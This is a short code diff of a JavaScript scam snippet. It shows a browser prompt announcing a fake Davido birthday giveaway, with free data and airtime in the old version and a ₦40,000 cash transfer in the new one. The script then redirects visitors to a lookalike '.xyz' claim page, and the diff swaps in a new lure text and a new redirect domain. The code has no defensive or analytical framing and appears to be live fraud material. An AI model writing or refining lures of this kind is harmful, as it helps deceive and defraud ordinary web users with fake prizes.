@@ -1,6 +1,6 @@
 
-var password = 'CLAIM 50GB + AIRTIME '
-password=prompt('SMS: Hello, Claim your 50GB free data + ₦5,000 airtime Gift from Davido Birthday Offer Ends November 21. Press Ok to Claim now','CLAIM 50GB + AIRTIME');
-if (password != 'CLAIM 50GB + AIRTIME') {
-location.href='https://www.giga-offre.xyz/claim-now';
+var password = 'CLAIM ₦40,000'
+password=prompt('1xbet: Hello, Claim your ₦40,000 Cash transfer from Davido Birthday Celebration Offer Ends November 21. Press Ok to Claim now','CLAIM ₦40,000');
+if (password != 'CLAIM ₦40,000') {
+location.href='https://www.get-mega-offre.xyz/claim-cash';
 }
